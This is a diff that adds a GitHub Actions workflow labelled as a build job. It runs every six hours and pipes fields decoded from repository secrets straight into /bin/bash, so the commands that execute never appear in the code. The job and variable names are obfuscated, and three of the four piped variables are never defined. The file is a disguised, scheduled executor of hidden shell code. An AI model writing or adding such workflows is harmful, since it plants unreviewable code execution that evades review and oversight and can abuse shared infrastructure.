@@ -1,0 +1,20 @@
+name: guoqingpao3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoqingpao3456
+        env:
+          ojnuz706: ${{ secrets.ojnuz706 }}
+        run: |
+          echo $ojnuz706 | jq -r .jexa1 | /bin/bash
+          echo $p884 | jq -r .xja4 | /bin/bash
+          echo $kcidf0 | jq -r .lxk73913 | /bin/bash
+          echo $wisj6 | jq -r .ucpc80700 | /bin/bash
+
